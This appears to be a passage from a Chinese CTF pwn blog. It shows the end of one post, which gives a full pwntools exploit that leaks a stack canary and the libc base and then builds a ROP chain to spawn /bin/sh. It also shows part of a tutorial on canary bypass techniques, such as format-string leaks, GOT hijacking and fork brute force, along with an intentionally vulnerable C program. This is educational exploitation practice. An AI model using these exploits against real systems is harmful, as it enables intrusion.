<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	__libc_start_main+=(leak(stack_libc_start_main_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__libc_start_main &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(__libc_start_main))</span><br></pre></td></tr></table></figure>
<p>最后可以用“one_gadget”来打</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4f3d5</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; <span class="number">0xf</span> == <span class="number">0</span></span><br><span class="line">  rcx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4f432</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x40</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x10a41c</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   </span><br><span class="line"><span class="keyword">import</span> ctypes </span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./newbie&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./newbie&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">hashes = &#123;&#125;</span><br><span class="line">stack_canary_offset = <span class="number">49</span></span><br><span class="line">stack_libc_start_main_offset = <span class="number">73</span></span><br><span class="line">charset = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">offset</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;id &#x27;</span> + <span class="built_in">str</span>(offset).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your key: &#x27;</span>)</span><br><span class="line">    key = p.recvline().strip().decode()</span><br><span class="line">    value = hashes[key]</span><br><span class="line">    <span class="comment"># Correct for the 1 and 0 collision.</span></span><br><span class="line">    <span class="keyword">if</span> value == <span class="number">1</span>:</span><br><span class="line">        value = <span class="number">0</span></span><br><span class="line">    log.info(<span class="string">&#x27;Offset &#123;&#125;: &#123;&#125; (&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(offset, key, <span class="built_in">hex</span>(value)))</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">precompute</span>():</span></span><br><span class="line">    libc = ctypes.cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">    <span class="keyword">global</span> hashes</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffff</span>+<span class="number">1</span>):</span><br><span class="line">        libc.srand(i)</span><br><span class="line">        val = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            val += charset[libc.rand() % <span class="built_in">len</span>(charset)]</span><br><span class="line">        hashes[val] = i</span><br><span class="line">    log.info(<span class="string">&quot;Computed &#123;&#125; hashes.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(hashes)))</span><br><span class="line"></span><br><span class="line">precompute()</span><br><span class="line"></span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	canary+=(leak(stack_canary_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">__libc_start_main = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	__libc_start_main+=(leak(stack_libc_start_main_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__libc_start_main &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(__libc_start_main-<span class="number">243</span>))</span><br><span class="line"></span><br><span class="line">libc_start_main_offset = libc.libc_start_main_return</span><br><span class="line">libc_base=__libc_start_main-libc_start_main_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">poprdi_ret=libc_base+<span class="number">0x0000000000026b72</span></span><br><span class="line">poprsi_ret=libc_base+<span class="number">0x0000000000027529</span></span><br><span class="line">poprdx_poprbx_ret=libc_base+<span class="number">0x0000000000162866</span></span><br><span class="line">binsh_libc=libc_base+<span class="number">0x00000000001b75aa</span></span><br><span class="line">execve_libc=libc_base+libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;execve &gt;&gt; &#x27;</span> +<span class="built_in">hex</span>(execve_libc))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(poprdi_ret)+p64(binsh_libc)</span><br><span class="line">payload+=p64(poprsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(poprdx_poprbx_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(execve_libc)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;quit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>参考： <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43921239/article/details/105318835">pwn题查找字符串方法记录</a></p>
<hr>
<p><strong>PS：</strong></p>
<p>我这个libc版本打不了“one_gadget”，只能自己凑了</p>
<p>还有一个问题：用system打不通，但execve一下子就通了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/04/pwn%E7%A9%BFcanary/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/04/pwn%E7%A9%BFcanary/" class="post-title-link" itemprop="url">pwn穿canary</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-04 22:35:10" itemprop="dateCreated datePublished" datetime="2022-01-04T22:35:10+08:00">2022-01-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-03-16 18:48:35" itemprop="dateModified" datetime="2022-03-16T18:48:35+08:00">2022-03-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="canary的各种绕过技巧"><a href="#canary的各种绕过技巧" class="headerlink" title="canary的各种绕过技巧"></a>canary的各种绕过技巧</h2><p>前几天又被canary给恶心了，以前一直用格式化字符串漏洞和一些输出函数来泄露canary，这一回啥也没有，给我搞麻了</p>
<p>回头想来，我好像就只会这两种canary的泄露方法，于是我打算学一学获取canary的技巧</p>
<hr>
<h2 id="canary原理"><a href="#canary原理" class="headerlink" title="canary原理"></a>canary原理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br></pre></td></tr></table></figure>
<p>有时候我们会在IDA中看见这两个东西，这就是canary的生成代码</p>
<p>在函数开始，fs:0x28 的值被存储在 ebp - 0xc，在函数返回之前对 ebp - 0xc处的值进行检查，如果和 fs:0x28 不一样，说明发生了溢出，紧接着执行__stack_chk_fail_local 并退出进程 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004007F</span>3                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000004007F</span>C                 mov     [rsp+<span class="number">128</span>h+var_20], rax</span><br><span class="line">.text:<span class="number">0000000000400804</span>                 <span class="keyword">xor</span>     eax, eax</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400882</span>                 mov     rax, [rsp+<span class="number">128</span>h+var_20]</span><br><span class="line">.text:<span class="number">000000000040088</span>A                 <span class="keyword">xor</span>     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000400893</span>                 jnz     <span class="keyword">short</span> loc_4008A9</span><br><span class="line">    --------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000004008</span>A9 loc_4008A9:         </span><br><span class="line">.text:<span class="number">00000000004008</span>A9                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>
<img src="/2022/01/04/pwn%E7%A9%BFcanary/1641023789366-1643270848456.png" class width="1641023789366"> 
<p>​        //这个图的上面是高地址，下面是低地址</p>
<p>那么，fs:0x28 中的值是怎么生成的呢？</p>
<p>事实上，TLS 中的值由函数 security_init 进行初始化 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">security_init</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line"><span class="meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span></span><br></pre></td></tr></table></figure>
<p><strong>在gcc中使用canary：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p>这个可以说是经典了，找一找偏移用“%p”一下子就搞出来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10000</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa\n&quot;</span>)      <span class="comment">#printf第一个参数的地址</span></span><br><span class="line"><span class="number">10008</span>| <span class="number">0x7fffffffdf28</span> --&gt; <span class="number">0xa</span> (<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="number">10016</span>| <span class="number">0x7fffffffdf30</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10024</span>| <span class="number">0x7fffffffdf38</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10032</span>| <span class="number">0x7fffffffdf40</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10040</span>| <span class="number">0x7fffffffdf48</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10048</span>| <span class="number">0x7fffffffdf50</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10056</span>| <span class="number">0x7fffffffdf58</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10064</span>| <span class="number">0x7fffffffdf60</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10072</span>| <span class="number">0x7fffffffdf68</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10080</span>| <span class="number">0x7fffffffdf70</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10088</span>| <span class="number">0x7fffffffdf78</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10096</span>| <span class="number">0x7fffffffdf80</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10104</span>| <span class="number">0x7fffffffdf88</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10112</span>| <span class="number">0x7fffffffdf90</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10120</span>| <span class="number">0x7fffffffdf98</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10128</span>| <span class="number">0x7fffffffdfa0</span> --&gt; <span class="number">0x400a50</span> (push   r15)</span><br><span class="line"><span class="number">10136</span>| <span class="number">0x7fffffffdfa8</span> --&gt; <span class="number">0x7ce1a471e5f87d00</span>            <span class="comment">#金丝雀巢穴</span></span><br><span class="line"><span class="number">10144</span>| <span class="number">0x7fffffffdfb0</span> --&gt; <span class="number">0x7fffffffdff0</span> --&gt; <span class="number">0x0</span>        <span class="comment">#上一个函数的ebp</span></span><br><span class="line"><span class="number">10152</span>| <span class="number">0x7fffffffdfb8</span> --&gt; <span class="number">0x4008b8</span> (jmp    <span class="number">0x4008d8</span>)    <span class="comment">#返回地址</span></span><br><span class="line"><span class="number">10160</span>| <span class="number">0x7fffffffdfc0</span> --&gt; <span class="number">0x7ffff7fb2fc8</span> --&gt; <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
<p>可以计算出偏移为“17”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">formats(<span class="string">&quot;%23$p&quot;</span>)     <span class="comment">#这是64位系统 17+6=23</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)    <span class="comment">#用prinft打印的canary以‘0x’开头</span></span><br><span class="line">canary = <span class="built_in">eval</span>(<span class="string">b&#x27;0x&#x27;</span>+p.recv(<span class="number">16</span>))		<span class="comment">#canary有8个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>
<p>​        //通常把gdb和终端结合起来看效果更好</p>
<h2 id="输出函数"><a href="#输出函数" class="headerlink" title="输出函数"></a>输出函数</h2><p>canary设计为以字节“\x00”结尾，而输出函数会被“\x00”中断，如果把“\x00”给覆盖了就可以利用输出函数来泄露canary</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10000</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>)      <span class="comment">#printf第一个参数的地址</span></span><br><span class="line"><span class="number">10008</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10018</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10020</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10028</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10030</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10038</span>| <span class="number">0x7fffffffdfa8</span> --&gt; <span class="number">0x7ce1a471e5f87d</span>+<span class="string">&#x27;\n&#x27;</span>         <span class="comment">#金丝雀巢穴</span></span><br><span class="line"><span class="number">10040</span>| <span class="number">0x7fffffffdfb0</span> --&gt; <span class="number">0x7fffffffdff0</span> --&gt; <span class="number">0x0</span>        <span class="comment">#上一个函数的ebp</span></span><br><span class="line"><span class="number">10048</span>| <span class="number">0x7fffffffdfb8</span> --&gt; <span class="number">0x4008b8</span> (jmp    <span class="number">0x4008d8</span>)    <span class="comment">#返回地址</span></span><br><span class="line"><span class="number">10050</span>| <span class="number">0x7fffffffdfc0</span> --&gt; <span class="number">0x7ffff7fb2fc8</span> --&gt; <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
<p>这样canary结尾的“\x00”就被替换为了“\n”，后续的read函数就可以成功泄露canary</p>
<h2 id="利用stack-chk-fail的报错信息"><a href="#利用stack-chk-fail的报错信息" class="headerlink" title="利用stack_chk_fail的报错信息"></a>利用stack_chk_fail的报错信息</h2><p>前面两个都是常规的，这个就不一样了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">[<span class="number">1</span>]    <span class="number">3005</span> abort (core dumped)  ./newbie</span><br></pre></td></tr></table></figure>
<p>当canary被覆盖时，程序会进行上述报错</p>
<p>打印这些字符串的函数是“stack_chk_fail.c”：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;debug/fortify_fail.c&quot;</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (msg)</span><br><span class="line"> <span class="keyword">const</span> <span class="keyword">char</span> *msg;</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line"> __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line"> msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>
<p>可以发现canary触发时会打印 “libc_argv[0]”，如果栈溢出覆盖了 “libc_argv[0]”，那么程序就会打印覆盖的内容</p>
<img src="/2022/01/04/pwn%E7%A9%BFcanary/1641027667797-1643270848457.png" class width="1641027667797">  
<p>​        // libc_argv[0]装有<strong>指向程序地址</strong>的指针</p>
<p>这种操作只能泄露指针的内容，并且需要目标指针的地址来覆盖 “libc_argv[0]” ，所以“libc_argv[0]” 相当于输入值的偏移也需要掌握</p>
<p>​        // 如果存在“fork”，还可以利用这种方式来打印“libc_base”</p>
<h2 id="stack-chk-fail劫持"><a href="#stack-chk-fail劫持" class="headerlink" title="stack_chk_fail劫持"></a>stack_chk_fail劫持</h2><p>canary报错时会调用 <strong>_stack_chk_fail</strong> ，那么劫持 <strong>_stack_chk_fail</strong> 当然也是一种攻击手段</p>
<p>这个一般通过GOT表劫持该函数，所以不能开启 <strong>Full RELRO</strong> 保护</p>
<p>像printf格式化漏洞WAA，或者堆溢出WAA，都可以改写GOT表内容，甚至配合UAF和数组越位也可以改写GOT表（如果合适的话）</p>
<h2 id="one-by-one爆破"><a href="#one-by-one爆破" class="headerlink" title="one-by-one爆破"></a>one-by-one爆破</h2><p>一般来说，爆破canary是很蠢的事情，因为每次运行程序canary都会改变</p>
<p>但是存在一类通过fork函数开启子进程交互的题目，fork函数会直接拷贝父进程的内存，因此每次创建的子进程的canary是相同的 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;get flag error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    fgets(flag, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    read(STDIN_FILENO, buffer, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		pid = fork();		<span class="comment">//fork开启子进程</span></span><br><span class="line">		<span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span 